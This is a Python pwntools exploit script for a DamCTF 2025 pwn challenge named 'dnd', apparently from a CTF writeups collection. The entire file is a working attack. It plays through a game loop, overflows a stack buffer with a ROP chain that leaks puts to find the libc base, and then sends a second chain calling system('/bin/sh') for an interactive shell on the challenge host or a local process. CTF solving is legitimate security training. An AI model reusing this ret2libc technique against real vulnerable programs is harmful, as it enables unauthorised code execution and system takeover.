#!/usr/bin/env python3
import sys

from pwn import *

context.binary = "/ctf-writeups/2025/damctf/pwn/dnd/dist/dnd"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]

elf = context.binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
pop_rdi_rbp = next(elf.search(asm("pop rdi; nop; pop rbp; ret")))

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def fight_loop(r):
    flag = False

    for _ in range(5):
        r.recvuntil(b"New")
        r.recvuntil(b"(")
        mob_hp = int(r.recv(1).decode())

        if flag is False and mob_hp > 5:
            flag = True
            r.sendlineafter(b"[r]un? ", b"a")
        else:
            r.sendlineafter(b"[r]un? ", b"r")


def leak_libc_base(r):
    rop = ROP(elf)
    rop.raw(b"A" * 0x68)
    rop.raw(pop_rdi_rbp)
    rop.raw(elf.got.puts)
    rop.raw(b"A" * 8)
    rop.raw(elf.sym.puts)
    rop.raw(elf.sym._Z3winv)

    r.sendlineafter(b"warrior? ", rop.chain())
    r.recvline()

    leaked_puts = u64(r.recvline().strip().ljust(8, b"\x00"))
    libc.address = leaked_puts - libc.sym.puts


def get_shell(r):
    rop = ROP(elf)
    rop.raw(b"A" * 0x68)
    rop.raw(pop_rdi_rbp)
    rop.raw(next(libc.search(b"/bin/sh")))
    rop.raw(b"A" * 8)
    rop.raw(rop.ret)
    rop.raw(libc.sym.system)

    r.sendlineafter(b"warrior? ", rop.chain())
    r.interactive()


def exploit(r):
    attach(r)
    fight_loop(r)
    leak_libc_base(r)
    get_shell(r)


if __name__ == "__main__":
    r = remote("dnd.chals.damctf.xyz", 30813) if is_remote else process(elf.path)
    exploit(r)
    sys.exit()
